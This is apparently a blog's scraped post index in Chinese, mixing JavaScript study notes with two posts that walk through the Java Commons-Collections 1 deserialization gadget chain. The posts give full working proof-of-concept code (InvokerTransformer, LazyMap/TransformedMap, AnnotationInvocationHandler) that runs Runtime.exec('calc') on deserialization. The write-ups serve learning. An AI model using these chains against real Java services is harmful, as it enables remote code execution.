这些BOM对象在浏览器中都是作为window对象的属性保存的，\n        可以通过window对象来使用，也可以直接使用\n\n\nNavigator\n    - 代表的当前浏览器的信息，通过该对象可以来识别不同的浏览器\n    - 由于历史原因，Navigator对象中大部分属性都已经不能帮助我们识别浏览器了\n    - 一般只会使用userAgent来判断浏览器的信息，\n        userAgent是一个字符串，这个字符串中包含有用来描述浏览器信息的内容，\n        不同的浏览器会有不同的userAgent\n\n    属性\n        userAgent\n            - 返回由客户机发送服务器的 user-agent 头部的值。\n            - 用法： \n                Navigator.userAgent \n\nHistory\n    - 对象可以用来操作浏览器向前或向后翻页\n\n    属性\n        length\n            - 可以获取到当前访问的链接数量\n\n    方法\n        back()\n            - 可以用来回退到上一个页面，作用和浏览器的回退按钮一样\n\n        forward()\n            - 可以跳转下一个页面，作用和浏览器的前进按钮一样\n\n        go()\n            - 可以用来跳转到指定的页面\n            - 它需要一个整数作为参数\n                1: 表示向前跳转一个页面 相当于forward()\n                2: 表示向前跳转两个页面\n                -1: 表示向后跳转一个页面\n                -2: 表向后跳转两个页面\n\nLocation\n    - 该对象中封装了浏览器的地址栏的信息\n    - 直接输出location，则会获取到地址栏的信息(当前页面的完整路径)\n\n    属性\n        hostname\n            - 设置或返回当前URL的主机名\n\n    方法\n        assign()\n            - 用来跳转到其他的页面，作用和直接修改location一样\n\n        reload()\n            - 用于重新加载当前页面，作用和刷新按钮一样\n            - 如果在方法中传递一个true，作为参数，则会强制清空缓存刷新页面\n\n        replace()\n            - 可以使用一个新的页面替换当前页面，调用完毕也会跳转页面\n                不好生成历史记录，不能使用回退按钮回退\n\n定时器\n\n    setInterval()\n        - 定时调用\n        - 可以将一个函数，每隔一段时间执行一次\n        - 参数：\n            1. 回调函数，该函数会每隔一段时间被调用一次\n            2. 每次调用间隔的时间，单位是毫秒\n\n        - 返回值\n            返回一个Number类型的数据\n            这个数字用来作为定时器的唯一标识\n\n        setInterval(function(){}, 1000);\n\n\n    clearInterval()\n        - 用来关闭一个定时器\n        - 方法中需要一个定时器的标识作为参数，这样会关闭标识对应的定时器\n\n\n\n    延时调用\n        - 延时调用一个函数不马上执行，而是隔一段时间以后在执行，而且只会执行一次\n        - 延时调用与定时调用区别：定时调用会执行多次，而延时调用只会执行一次\n        - 说明：延时调用河定时调用实际上是可以互相代替的，在开发中可以根据自己需要去选择\n\n        setTimeout()\n            - 用来开启一个延时调用\n            - 参数同定时调用一致\n\n        clearTimeout()\n            - 用来关闭一个延时调用JSON(JS对象表示法)    - js中的对象只有js自己认识，其他的语言都不认识    - JSON就是一个特殊格式的字符串，这个字符串可以被任意的语言所识别        并且可以转换为任意语言中的对象，JSON在开发中主要用来数据交互\n- JSON\n    - Javascript Object Notation JS对象表示法\n    - JSON 和 JS对象的格式一样，只不过JSON字符串中的属性名必须加双引号\n        其他的和JS语法一致\n\n    - JSON分类\n        1. 对象 {}\n        2. 数组 {}\n\n    - JSON中允许的值\n        1. 字符串\n        2. 数值\n        3. 布尔值\n        4. null\n        5. 对象\n        6. 数组\n\n- JSON的转换\n    - 将JSON字符串转换为JS中的对象\n    - 在JS中，为我们提供了一个工具类，就叫JSON\n        这个对象可以帮助我们将JSON转换为JS对象，也可以将一个JS对象转换为JSON\n\n    - JSON --&gt; js对象 \n        方法：\n            JSON.parse()\n                - 可以将JSON字符串转换为js对象\n                - 它需要一个JSON字符串作为参数， 会将该字符串转换为JS对象并返回\n\n    - js对象 --&gt; JSON\n        方法：\n            JSON.stringify()\n                - 可以将一个JS对象转换为JSON字符串\n                - 需要一个js对象作为参数，会返回一个JSON字符串\n\n注意事项：\n    JSON这个对象在IE7及以下的浏览器中不支持，有些浏览器中调用会报错\n\n\neval()\n    - 这个函数可以用来执行一段字符串形式的JS代码，并将执行结果返回\n    - 如果使用eval()执行的字符串中含有{}, 它会将{}当成是代码块\n        如果不希望当成代码块来执行，则需要在字符串外加一个()\n\n    - eval() 这个函数的功能很强大, 可以直接执行一个字符中的JS代码\n        但是在开发中尽量不要使用，首先它的执行性能比较差，然后它还存在安全隐患。","categories":["Javascript"],"tags":["javascript学习"]},{"title":"Java反序列化Common-Collections1利用链分析","url":"/2022/08/09/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Common-Collections1%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/","content":"前言之前在Java安全学习笔记（2）中写过Common-Collections这条链学习笔记，笔记是跟着p牛的java安全漫谈系列写的，利用的点都是一致的，只是触发的点，p牛用的是TransformedMap这个类，ysoserial是用的LazyMap，使用LazyMap触发的这条链用到了对象代理技术，接下来这边文章，就来分析ysoserial中Common-Collections1这条链的利用方式。\n环境commons-collections &lt;= 3.2.1\nJDK &lt;= 8u70 （从8u71之后修复了）\n利用链分析在ysoserial中Common-Collections1的payload\n\n\n\n\n\n\n\n看起来比URLDNS的payload多了不少代码，拆分后来看其实也还好，首先看看构造利用点的三个关键类ConstantTransformer、InvokerTransformer、ChainedTransformer。\n首先来看看ChainedTransformer这个类的transform方法\n\n\n\n\n\n\n\n这个方法类似于链式调用一样，将iTransformers这个数组中的对象的transform都调用一遍，并且传入的参数是上一次个对象调用后的结果，这可能听起来有点绕，用idea多跟几遍也就明白了。\n再来看看ConstantTransformer这个类的transform方法\n\n\n\n\n\n\n\n这个方法只返回了一个对象，在创建对象的时候可以控制iConstan参数，比如创建对象我传入一个Runtime.class，那么调用该方法，返回的就是Runtime.class。\n最后再来看看触发命令执行的类InvokerTransformer的transform方法\n\n\n\n\n\n\n\n学了反射的都知道，这个方法的作用就是传入一个对象，通过反射去获取这个这个对象的任意方法，然后再调用。并且在创建InvokerTransformer对象的时候，可以控制传入的方法名和参数。\n接下来，通过new一个InvokerTransformer对象，执行transform方法，来弹出一个计算器。\n\n\n\n\n\n\n\n成功达到执行命令的效果。\n看看ysoserial中执行命令的方式\n\n\n\n\n\n\n\n为什么ysoserial中不是直接调用exec来触发命令的呢？\n因为Runtime这个类是没有实现Serializable接口，不能对其进行反序列化，直接反序列化会进行报错。\n解决这个问题的方式就是通过反射调用Runtime.getRuntime().exec()方法。\n当执行InvokerTransformer的transform方法时，我们可以先获取到Runtime的getMethod方法，在通过获取的到getMethod的去获取getRuntime方法，有点套娃的感觉，反射获取反射方法。然后再调用获取到Runtime对象，最后exec执行命令。\n接下来，只需要调用ChainedTransformer的transform方法，就会将整个transforms数组中的对象串联起来，挨个执行transform方法，前一个对象的返回结果作为后一个对象的参数值。\n\n\n\n\n\n\n\n到这里，我们只需要找出一条xx.readObject -&gt; gadget-&gt;  ChainedTransformer.transform即可。\nysoserial中是用的LazyMap的get方法。\n\n\n\n\n\n\n\n然后再通过AnnotationInvocationHandler的invoke方法调用LazyMap的get方法\n\n\n\n\n\n\n\n那要怎么才能调用到AnnotationInvocationHandler的invoke方法呢？答案是使用对象代理。\nJava对象动态代理Java对象代理是一种设计模式，提供了对目标对象另外的访问方式，即通过代理对象访问目标对象。可以不修改目标对象，对目标对象功能进行拓展。生活中也有类似的例子，生活中常见的例子就是，去电影院看电影，电影院播放的电影都是制片厂商授权给电影院播放，电影院就像一个代理商，除了播放电影，在观影期间，电影院还可以再开头和结尾插播一下广告。而Java对象代理，可以通过代理原来的对象，在不修改原来对象的基础对其功能进行增强和扩展。\n关于Java对象代理网上有很多文章，就不展开写了，主要还是分析利用链。\nJava中对象动态代理的方法\nProxy.newProxyInstance(ClassLoader loader,Class&lt;?&gt;[] interfaces,InvocationHandler h)\n\nClassLoader loader 传递一个类加载器，使用对象默认的加载器即可\nClass&lt;?&gt;[] interfaces 传递一个接口，对那个接口使用动态代理\nInvocationHandler h  传递一个InvocationHandler对象，这个对象的作用就是处理被代理的对象需要做的逻辑。InvocationHandler 是一个接口，有一个invoke方法，当被代理对象调用任意方法时，都会调用invoke方法。\nysoserial中则是对LazyMap对象进行了动态代理，对其进行序列化，在执行readObject反序列化过程中，只要被代理过的对象调用任意方法，都会执行invoke方法。\n重新再梳理一遍，我们通过构造三个InvokerTransformer这个类对象，达到了以反射的方式调用了Runtime类的exec方法执行命令，再构造一个Transformer数组，将该数组作为参数创建ChainedTransformer对象，然后只需要调用ChainedTransformer的transform方法，就能弹出计算机。\n但是如果通过反序列化来调用的话，需要构造一条gadget。在LazyMap的get方法中，factory变量调用了transform方法。在AnnotationInvocationHandler的invoke方法中，memberValues变量调用了get方法。那问题来了，要怎么在反序列化的情况下调用到invoke方法呢？\n先看看什么情况下，会调用到invoke？\n对对象进行动态代理，创建一个继承InvocationHandler类的实例，重写invoke方法，在创建代理的时候传入这个实例，当这个实例调用任意方法的时候，就会自动触发调用invoke。\n而在AnnotationInvocationHandler的readObject方法中，有一条语句memberValues.entrySet。\n\n\n\n\n\n\n\n假设我们传入被动态代理过后的LazyMap对象，是不是就可以触发调用invoke方法了呢？\n答案是肯定的。\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n直接弹出来计算机。\n利用链至此，我们得到一个利用链\nAnnotationInvocationHandler-&gt;readObjectAnnotationInvocationHandler-&gt;invokeLazyMap-&gt;getChainedTransformer-&gt;transformConstantTransformer-&gt;transformInvokerTransformer-&gt;transform\n\npackage org.example;import org.apache.commons.collections.Transformer;import org.apache.commons.collections.functors.ChainedTransformer;import org.apache.commons.collections.functors.ConstantTransformer;import org.apache.commons.collections.functors.InvokerTransformer;import org.apache.commons.collections.map.LazyMap;import java.io.ByteArrayInputStream;import java.io.ByteArrayOutputStream;import java.io.ObjectInputStream;import java.io.ObjectOutputStream;import java.lang.annotation.Retention;import java.lang.reflect.*;import java.util.HashMap;import java.util.Map;public class test &#123;    public static void main(String[] args) throws Exception&#123;        Transformer[] transformers = new Transformer[]&#123;                new ConstantTransformer(Runtime.class),                new InvokerTransformer(\"getMethod\", new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;\"getRuntime\",null&#125;),                new InvokerTransformer(\"invoke\", new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;),                new InvokerTransformer(\"exec\", new Class[]&#123;String.class&#125;, new Object[]&#123;\"calc\"&#125;)        &#125;;        // 先传入一个无害的payload 防止序列化前就执行        ChainedTransformer transformer = new ChainedTransformer(new Transformer[]&#123;new ConstantTransformer(1)&#125;);        HashMap&lt;Object, Object&gt; map = new HashMap&lt;Object, Object&gt;();        Map decorate = LazyMap.decorate(map, transformer);        Class&lt;?&gt; AnnotationInvocation = Class.forName(\"sun.reflect.annotation.AnnotationInvocationHandler\");        Constructor&lt;?&gt; declaredConstructor = AnnotationInvocation.getDeclaredConstructor(Class.class, Map.class);        declaredConstructor.setAccessible(true);        InvocationHandler h = (InvocationHandler)declaredConstructor.newInstance(Retention.class, decorate);        Object o1 = Proxy.newProxyInstance(Map.class.getClassLoader(), new Class[]&#123;Map.class&#125;, h);//        System.out.println(o1 instanceof Proxy);        setFieldValue(transformer, \"iTransformers\", transformers);        // 将被代理的对象重新实例化进行 InvocationHandler        InvocationHandler h1 = (InvocationHandler)declaredConstructor.newInstance(Retention.class, o1);        // 将payload修改回来        ByteArrayOutputStream serializ = Serializ(h1);        UnSerializ(serializ);    &#125;    // 序列化    public static ByteArrayOutputStream Serializ(Object o) throws Exception &#123;        // 序列化        ByteArrayOutputStream barr = new ByteArrayOutputStream();        ObjectOutputStream outputStream = new ObjectOutputStream(barr);        outputStream.writeObject(o);        return barr;    &#125;    // 反序列化    public static void UnSerializ(ByteArrayOutputStream baos) throws Exception &#123;        ByteArrayInputStream bais = new ByteArrayInputStream(baos.toByteArray());        ObjectInputStream ois = new ObjectInputStream(bais);        ois.readObject();    &#125;    // 反射修改对象的变量值    public static void setFieldValue(Object o, String f, Object v) throws Exception&#123;        Class c = o.getClass();        Field field = c.getDeclaredField(f);        field.setAccessible(true);        field.set(o, v);    &#125;&#125;\n\n参考文章java动态代理\nhttps://blog.csdn.net/zcc_0015/article/details/22695647\n","categories":["Java安全"],"tags":["java安全漫谈","java反序列化"]},{"title":"Java安全学习笔记（二）","url":"/2022/06/04/Java%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E4%BA%8C%EF%BC%89/","content":"前言最近在看p牛的Java安全漫谈反序列化篇，详细分析了CommonsCollections 这条链。\n环境​    jdk 版本 &lt;=8u70\n​    Apache Commons Collections &lt;= 3.2.1\nCommonsCollections 分析先给出完整的利用链\nTransformer[] transformers = new Transformer[]&#123;\t\tnew ConstantTransformer(Runtime.class),\t\tnew InvokerTransformer(\"getMethod\", new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;\"getRuntime\",null&#125;),\t\tnew InvokerTransformer(\"invoke\", new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;),\t\tnew InvokerTransformer(\"exec\", new Class[]&#123;String.class&#125;, new Object[]&#123;\"calc\"&#125;)&#125;;ChainedTransformer transformer = new ChainedTransformer(transformers);HashMap&lt;Object, Object&gt; map = new HashMap&lt;Object, Object&gt;();map.put(\"value\", \"value\");Map&lt;Object, Object&gt; transformedMap = TransformedMap.decorate(map, null, transformer);Class&lt;?&gt; annotationInvocationHandler = Class.forName(\"sun.reflect.annotation.AnnotationInvocationHandler\");Constructor&lt;?&gt; constructor = annotationInvocationHandler.getDeclaredConstructor(Class.class, Map.class);constructor.setAccessible(true);Object o = constructor.newInstance(Retention.class, transformedMap);UnSerializ(Serializ(o));\n\n利用点从利用点开始分析\nInvokerTransformer-&gt;transform\npublic Object transform(Object input) &#123;        if (input == null) &#123;            return null;        &#125; else &#123;            try &#123;                Class cls = input.getClass();                Method method = cls.getMethod(this.iMethodName, this.iParamTypes);                return method.invoke(input, this.iArgs);            &#125; catch (NoSuchMethodException var4) &#123;                throw new FunctorException(\"InvokerTransformer: The method '\" + this.iMethodName + \"' on '\" + input.getClass() + \"' does not exist\");            &#125; catch (IllegalAccessException var5) &#123;                throw new FunctorException(\"InvokerTransformer: The method '\" + this.iMethodName + \"' on '\" + input.getClass() + \"' cannot be accessed\");            &#125; catch (InvocationTargetException var6) &#123;                throw new FunctorException(\"InvokerTransformer: The method '\" + this.iMethodName + \"' on '\" + input.getClass() + \"' threw an exception\", var6);            &#125;        &#125;    &#125;\n\n这个方法可以实现任意方法执行，通过传入一个对象，然后反射调用该对象的方法执行，通过查看该对象的构造方法，发现方法名、参数名可控。\npublic InvokerTransformer(String methodName, Class[] paramTypes, Object[] args) &#123;        this.iMethodName = methodName;        this.iParamTypes = paramTypes;        this.iArgs = args;    &#125;\n\n​    接下来通过该对象执行命令\nRuntime runtime = Runtime.getRuntime();new InvokerTransformer(\"exec\", new Class[]&#123;String.class&#125;, new Object[]&#123;\"calc\"&#125;).transform(runtime);\n\n\n\n\n\n\n\n\n寻找利用链刚刚是我自己调用了transform方法，接下来来看看有哪个方法中调用了transform。\n点进transform方法，find Usages查看引用。\n\n\n\n\n\n\n\n上面的21处都引用了transform方法，LazyMap和TransformedMap类都能可以利用，这里选择TransformedMap进行进一步利用。\n\n\n\n\n\n\n\n在TransformedMap类中checkSetValue方法调用了transform方法。\n接下来看看什么地方引用了checkSetValue方法。\n在TransformedMap的父类AbstractInputCheckedMapDecorator找到 MapEntry 类的setValue中调用了checkSetValue。\n\n\n\n\n\n\n\n怎么去执行这个setValue呢? \n每个Entry其实就是每个(key,value)，通过for(Map.Entry entry:transformedMap.entrySet())去遍历每个Enety，就可以调用setValue方法，然后就会执行checkSetValue，进而调用transform方法执行命令。\nRuntime runtime = Runtime.getRuntime();InvokerTransformer invokerTransformer = new InvokerTransformer(\"exec\", new Class[]&#123;String.class&#125;, new Object[]&#123;\"calc\"&#125;);HashMap&lt;Object, Object&gt; map = new HashMap&lt;Object, Object&gt;();map.put(\"key\", \"value\");Map&lt;Object, Object&gt; transformedMap = TransformedMap.decorate(map, null, invokerTransformer);for(Map.Entry entry:transformedMap.entrySet())&#123;    entry.setValue(runtime);&#125;\n\n\n\n\n\n\n\n\n目前为止，我们可以通过setValue方法设置map的值来触发命令执行。我们都知道反序列化会自动执行readObject方法，我们去查找哪个类的readObject方法引用了setValue方法。\n\n\n\n\n\n\n\n有34处引用了setValue方法，看看有没有readObject方法引用setValue方法。\n在AnnotationInvocationHandler类中的readObject方法调用了setValue。\nprivate void readObject(java.io.ObjectInputStream s)        throws java.io.IOException, ClassNotFoundException &#123;        s.defaultReadObject();        // Check to make sure that types have not evolved incompatibly        AnnotationType annotationType = null;        try &#123;            annotationType = AnnotationType.getInstance(type);        &#125; catch(IllegalArgumentException e) &#123;            // Class is no longer an annotation type; time to punch out            throw new java.io.InvalidObjectException(\"Non-annotation type in annotation serial stream\");        &#125;        Map&lt;String, Class&lt;?&gt;&gt; memberTypes = annotationType.memberTypes();        // If there are annotation members without values, that        // situation is handled by the invoke method.        for (Map.Entry&lt;String, Object&gt; memberValue : memberValues.entrySet()) &#123;            String name = memberValue.getKey();            Class&lt;?&gt; memberType = memberTypes.get(name);            if (memberType != null) &#123;  // i.e. member still exists                Object value = memberValue.getValue();                if (!(memberType.isInstance(value) ||                      value instanceof ExceptionProxy)) &#123;                    memberValue.setValue(                        new AnnotationTypeMismatchExceptionProxy(                            value.getClass() + \"[\" + value + \"]\").setMember(                                annotationType.members().get(name)));                &#125;            &#125;        &#125;    &#125;\n\n\n\n\n\n\n\n\n看看这个类的构造方法\n\n\n\n\n\n\n\n发现需要传入两个参数，一个需要传入一个注解，另一个个可以控制memberValues属性，而恰好就是通过该属性调用了setValue方法，这就很棒。\n接下来创建该对象\nClass&lt;?&gt; annotationInvocationHandler = Class.forName(\"sun.reflect.annotation.AnnotationInvocationHandler\");Constructor&lt;?&gt; constructor = annotationInvocationHandler.getDeclaredConstructor(Class.class, Map.class);constructor.setAccessible(true);Object o = constructor.newInstance(Override.class, transformedMap);\n\n该类比较特殊，需要通过反射才能拿到，传入的是一个Override注解，这个注解在后面会有一个坑，待会调试后再来调整。\n接下来对最终的AnnotationInvocationHandler对象进行序列化，然后再将其反序列化，看看是否可以成功执行刚刚构造的InvokerTransformer-&gt;transform。\nRuntime runtime = Runtime.getRuntime();InvokerTransformer invokerTransformer = new InvokerTransformer(\"exec\", new Class[]&#123;String.class&#125;, new Object[]&#123;\"calc\"&#125;);HashMap&lt;Object, Object&gt; map = new HashMap&lt;Object, Object&gt;();map.put(\"key\", \"value\");Map&lt;Object, Object&gt; transformedMap = TransformedMap.decorate(map, null, invokerTransformer);Class&lt;?&gt; annotationInvocationHandler = Class.forName(\"sun.reflect.annotation.AnnotationInvocationHandler\");Constructor&lt;?&gt; constructor = annotationInvocationHandler.getDeclaredConstructor(Class.class, Map.class);constructor.setAccessible(true);Object o = constructor.newInstance(Override.class, transformedMap);// 序列化ByteArrayOutputStream barr = new ByteArrayOutputStream();ObjectOutputStream outputStream = new ObjectOutputStream(barr);outputStream.writeObject(o);System.out.println(barr);// 反序列化ByteArrayInputStream bais = new ByteArrayInputStream(barr.toByteArray());ObjectInputStream stream = new ObjectInputStream(bais);stream.readObject();\n\n\n\n\n\n\n\n\n发现执行后，只输出了序列化后的数据，并没有执行到命令，接下来打个断点进行调试下。\n\n\n\n\n\n\n\n这里有个坑，就是断点打在上面这条语句是断不到的。\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n执行readObject方法的过程中，需要满足一个条件 memberType != null， 调试中memberType的值为null。\n那么要怎么才能满足这个条件呢?\n因为看源码比较绕，通过看p牛的文章结合自己的思考，直接给出条件。\n\n在对AnnotationInvocationHandler初始化的时候，第一个参数需要传入一个注解，这个注解当中要有变量，对map进行赋值，它的key 要跟注解当中的变量同名。\nString name = memberValue.getKey();  // 拿到map的键名Class&lt;?&gt; memberType = memberTypes.get(name); // 在通过键名在注解中进行查找\n\n\n\n最开始，传入的是Override.class\nObject o = constructor.newInstance(Override.class, transformedMap);\n\n\n\n\n\n\n\n\n里面并没有定义任何变量，在Retention,发现一个value\n\n\n\n\n\n\n\n接下来将Override.class替换成Retention.class\nMap的的键名改成value\nRuntime runtime = Runtime.getRuntime();InvokerTransformer invokerTransformer = new InvokerTransformer(\"exec\", new Class[]&#123;String.class&#125;, new Object[]&#123;\"calc\"&#125;);HashMap&lt;Object, Object&gt; map = new HashMap&lt;Object, Object&gt;();map.put(\"value\", \"value\");Map&lt;Object, Object&gt; transformedMap = TransformedMap.decorate(map, null, invokerTransformer);Class&lt;?&gt; annotationInvocationHandler = Class.forName(\"sun.reflect.annotation.AnnotationInvocationHandler\");Constructor&lt;?&gt; constructor = annotationInvocationHandler.getDeclaredConstructor(Class.class, Map.class);constructor.setAccessible(true);Object o = constructor.newInstance(Retention.class, transformedMap);\n\n再次进行调试\n\n\n\n\n\n\n\n可以发现memberType已经不为空。\n当我再次进行反序列化的时候，却报了个错\n\n\n\n\n\n\n\n说的是exec 这个方法 在class sun.reflect.annotation.AnnotationTypeMismatchExceptionProxy不存在。\n原因是Runtime 这个类并没有实现序列化接口，不能够直接进行序列化，需要进行反射调用。\nTransformer[] transformers = new Transformer[]&#123;new ConstantTransformer(Runtime.class),new InvokerTransformer(\"getMethod\", new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;\"getRuntime\",null&#125;),new InvokerTransformer(\"invoke\", new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;),new InvokerTransformer(\"exec\", new Class[]&#123;String.class&#125;, new Object[]&#123;\"calc\"&#125;)&#125;;ChainedTransformer transformer = new ChainedTransformer(transformers);\n\n接下来，涉及到关键的三个类ChainedTransformer ConstantTransformer InvokerTransformer\nChainedTransformer构造方法\n\n\n\n\n\n\n\n构造方法的作用很简单，就是接收一个transformer数组，然后将该数组赋值给了类属性this.iTransformers。\ntransformer方法\n\n\n\n\n\n\n\n这个方法的作用是遍历传入的transformer数组，里面保存的都是实现了transformer接口的对象，会挨个调用每个对象tranform方法，并且第一次调用后会将返回的结果作为下一个对象的参数再次调用。（放一张p牛的图）\n\n\n\n\n\n\n\nConstantTransformer类构造方法 和 transform方法\n\n\n\n\n\n\n\n这个类的构造方法会接收一个对象，并且将该对象赋值给this.iConstant，调用 transform方法就会返回该对象。上面代码传入的是Runtime.getRuntime()。执行transform方法后将得到一个Runtime类的实例。\nInvokerTransformer类构造方法\n\n\n\n\n\n\n\ntransform方法\n\n\n\n\n\n\n\n这个方法的功能是传入一个对象，然后通过反射拿到这个对象的类，在通过类拿到和方法名、参数类型拿到这个方法，在调用该方法。简单来说就是通过传入一个对象拿到指定方法，传指定参数进行调用，并且对象、方法名、参数都可控。\nnew InvokerTransformer(&quot;exec&quot;, new Class[]{String.class}, new Object[]{&quot;calc.exe&quot;})\n再回过头看看刚刚的代码\nTransformer[] transformers = new Transformer[]&#123;new ConstantTransformer(Runtime.class),new InvokerTransformer(\"getMethod\", new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;\"getRuntime\",null&#125;),new InvokerTransformer(\"invoke\", new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;),new InvokerTransformer(\"exec\", new Class[]&#123;String.class&#125;, new Object[]&#123;\"calc\"&#125;)&#125;;ChainedTransformer transformer = new ChainedTransformer(transformers);\n\n只需要执行new ChainedTransformer(transformers).transform，就会将transformers数组中的四个对象链接起来，最后执行命令。\n// new ConstantTransformer(Runtime.class)Class input = Runtime.class;// new InvokerTransformer(\"getMethod\", new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;\"getRuntime\",null&#125;),Class cls = input.getClass();Method getMethod = cls.getMethod(\"getMethod\", new Class[]&#123;String.class, Class[].class&#125;);Object getRuntime = getMethod.invoke(input, new Object[]&#123;\"getRuntime\",null&#125;);// new InvokerTransformer(\"invoke\", new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;)Class cls1 = getRuntime.getClass();Method invoke = cls1.getMethod(\"invoke\", new Class[]&#123;Object.class, Object[].class&#125;);Object invoke1 = invoke.invoke(getRuntime, new Object[]&#123;null, null&#125;);// new InvokerTransformer(\"exec\", new Class[]&#123;String.class&#125;, new Object[]&#123;\"calc\"&#125;)&#125;;Class&lt;?&gt; cls2 = invoke1.getClass();Method exec = cls2.getMethod(\"exec\", new Class[]&#123;String.class&#125;);exec.invoke(invoke1,\"calc\");\n\n用最笨的办法将上面的语句连接起来执行，最后成功执行了命令。\n有点像俄罗斯套娃，利用反射获取反射。\n完整利用链至此，一个完整的CC1利用链就构造完成了。\npackage org.example;import org.apache.commons.collections.Transformer;import org.apache.commons.collections.functors.ChainedTransformer;import org.apache.commons.collections.functors.ConstantTransformer;import org.apache.commons.collections.functors.InvokerTransformer;import org.apache.commons.collections.map.TransformedMap;import java.io.ByteArrayInputStream;import java.io.ByteArrayOutputStream;import java.io.ObjectInputStream;import java.io.ObjectOutputStream;import java.lang.annotation.Retention;import java.lang.reflect.Constructor;import java.util.HashMap;import java.util.Map;public class CC1 &#123;    public static void main(String[] args) throws Exception &#123;        Transformer[] transformers = new Transformer[]&#123;                new ConstantTransformer(Runtime.class),                new InvokerTransformer(\"getMethod\", new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;\"getRuntime\",null&#125;),                new InvokerTransformer(\"invoke\", new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;),                new InvokerTransformer(\"exec\", new Class[]&#123;String.class&#125;, new Object[]&#123;\"calc\"&#125;)        &#125;;        ChainedTransformer transformer = new ChainedTransformer(transformers);        HashMap&lt;Object, Object&gt; map = new HashMap&lt;Object, Object&gt;();        map.put(\"value\", \"value\");        Map&lt;Object, Object&gt; transformedMap = TransformedMap.decorate(map, null, transformer);                Class&lt;?&gt; annotationInvocationHandler = Class.forName(\"sun.reflect.annotation.AnnotationInvocationHandler\");        Constructor&lt;?&gt; constructor = annotationInvocationHandler.getDeclaredConstructor(Class.class, Map.class);        constructor.setAccessible(true);        Object o = constructor.newInstance(Retention.class, transformedMap);        UnSerializ(Serializ(o));            &#125;    // 序列化    public static ByteArrayOutputStream Serializ(Object o) throws Exception &#123;        // 序列化        ByteArrayOutputStream barr = new ByteArrayOutputStream();        ObjectOutputStream outputStream = new ObjectOutputStream(barr);        outputStream.writeObject(o);        return barr;    &#125;    // 反序列化    public static void UnSerializ(ByteArrayOutputStream baos) throws Exception &#123;        ByteArrayInputStream bais = new ByteArrayInputStream(baos.toByteArray());        ObjectInputStream ois = new ObjectInputStream(bais);        ois.readObject();    &#125;&#125;\n\n总结这条链对于我这种Java安全新手来说确实还是有很大难度，因为是第一次分析反序列化链条，后序还有很多链条会分析，所以就详细分析cc1，为之后分析打好基础，也陆陆续续分析了几天，踩了很多的坑，看了很多人的博客，理清楚每个知识点。其实这个过程还是很有意思的，再把整个过程总结出来，更能发现那些地方没搞懂。\n参考文章&amp;视频https://blog.chaitin.cn/2015-11-11_java_unserialize_rce/\nhttps://www.yuque.com/tianxiadamutou/zcfd4v/hsh32p\nJava安全漫谈反序列化篇4\nhttps://www.bilibili.com/video/BV1no4y1U7E1?spm_id_from=333.1007.top_right_bar_window_history.content.click（流程清晰）\n","categories":["Java安全"],"tags":["java安全漫谈","java安全"]},{"title":"Javascript高级笔记","url":"/2020/08/31/Javascript%E9%AB%98%E7%BA%A7%E7%AC%94%E8%AE%B0/","content":"JS高级学习笔记基础总结深入理解数据类型1. 分类\n基本(值)类型\nString: 任意字符串\nNumber: 任意的数字\nBoolean: true/false\nundefined: undefined\nnull: null\n\n\n对象(引用)类型\nObject: 任意类型\nFunction: 一种特别的对象(可以执行)\nArray: 一种特别的对象(对象下标)\n\n\n\n2. 判断\n如何判断数据类型?\ntypeof\ninstanceof\n===\n\n\n\n相关问题\nundefined与null的区别?\n\nundefined代表定义未赋值null定义并赋值了，只是值为null\n\n\n什么时候给变量赋值为null呢?\n\n初识赋值，表示将要赋值为对象结束前,让对象成为垃圾对象(被垃圾回收器回收)\n\n\n严格区别变量类型与数据类型?\n\n数据的类型\n基本类型\n对象类型\n\n\n变量的类型(变量内存值的类型)\n基本类型: 保存就是基本类型的数据\n引用类型: 保存的是地址值\n\n\n\n\n\n数据_变量_内存1. 什么是数据?\n存储在内存中代表特定信息的’玩意’,本质是以0101形式存储\n数据的特点\n可传递\n可运算\n\n\n哲学思想\n一切皆数据\n\n\n内存中操作的目标\n就是操作数据\n\n\n数据能进行哪些操作?\n算术运算\n赋值\n逻辑运算\n运行函数\n\n\n\n2. 什么是内存?\n内存条通电后产生的可存储数据的空间(临时的)\n内存的产生和死亡\n内存条(一块电路板) -&gt; 通电 -&gt; 产生内存空间 -&gt; 存储数据 -&gt; 处理数据 -&gt; 断电  -&gt; 内存空间和数据都消失\n\n\n一块小内存的2个数据\n内部存储的数据\n地址值\n\n\n内存分类\n栈: 存储 全局变量/局部变量\n堆: 存储 对象\n\n\n\n3. 什么是变量?\n可变化的量,由变量名和变量值组成\n每个变量都对应的一块小内存,变量名用来查找对应的内存,变量值就是内存中保存的数据\n\n4. 内存,数据,变量三者之间的关系?\n内存用来存储数据的空间\n变量是内存的标识\n\n关于赋值和内存的问题\nvar a = xxx, a内存中到底保存的是什么?\n\nxxx是基本数据,保存的就是这个数据\nxxx是对象, 保存的就是对象的地址值\nxxx是一个变量, 保存的xxx的内存内容(可能是基本数据, 也可能是地址值)\n\n\n关于引用变量赋值问题\n\n\n\n2个引用变量指向同一对象, 通过一个变量修改对象内部数据, 另一个变量看到的是修改之后的数据\n\n// 2个引用变量指向同一个对象var obj1 = &#123;name: 'tom'&#125;;var obj2 = obj1;// 通过一个变量修改对象内部数据obj1.name = 'Jack';// 另一个变量看到的是修改之后的数据console.log(obj2.name) //Jackfunction fn(obj)&#123;    obj.name = 'Dock';&#125;fn(obj1);console.log(obj2.name); //Dock\n\n\n2个引用变量指向同一个对象, 